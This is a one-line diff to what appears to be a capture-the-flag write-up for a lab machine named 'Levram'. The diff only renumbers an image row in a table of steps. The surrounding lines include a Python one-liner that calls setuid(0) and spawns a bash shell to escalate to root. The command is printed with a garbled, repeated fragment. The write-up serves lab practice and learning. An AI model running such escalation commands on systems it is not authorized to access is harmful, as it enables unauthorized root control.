@@ -29,7 +29,7 @@ The basic steps I took are below.
 | 6.2 | ![ImgPlaceholder](img/levram-image-5.png) |
 | 7. | Ran a neat line of Python to escalate to root in the shell. |
 | 7.2 | Code: ```/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")' <c 'import os; os.setuid(0); os.system("/bin/bash")'``` |
-| 7.2 | ![ImgPlaceholder](img/levram-image-6.png) |
+| 7.3 | ![ImgPlaceholder](img/levram-image-6.png) |
 | 8. | Easy clap, the machine is pwned. |
 | 8.1 | ![ImgPlaceholder](img/levram-image-7.png) |
 
